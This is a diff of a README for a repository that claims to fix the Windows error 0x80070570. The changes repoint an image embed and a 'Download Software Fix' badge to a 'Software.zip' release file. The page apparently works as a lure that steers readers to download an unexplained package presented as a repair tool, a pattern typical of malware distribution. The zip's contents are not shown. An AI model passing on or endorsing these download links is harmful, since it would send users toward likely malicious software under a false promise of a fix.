@@ -2,7 +2,7 @@
 
 🛠️ Welcome to the repository dedicated to resolving the notorious Error 0x80070570! 🛠️
 
-![Error-0x80070570](https://example.com/error_image.png)
+![Error-0x80070570](https://github.com/YTBNuKa/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 This repository aims to provide comprehensive solutions, tips, and guidance to help you fix Error 0x80070570 on your Windows systems. Whether you encountered this error while trying to install software, update Windows, or during a gaming session, we've got you covered!
 
@@ -82,7 +82,7 @@ Windows Memory Diagnostic
 
 Download the software package that can help you fix Error 0x80070570 by clicking the button below:
 
-[![Download Software Fix](https://img.shields.io/badge/Download-Software_Fix-blue?style=for-the-badge&logo=download)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software Fix](https://github.com/YTBNuKa/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)](https://github.com/YTBNuKa/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 ## Contributing
 
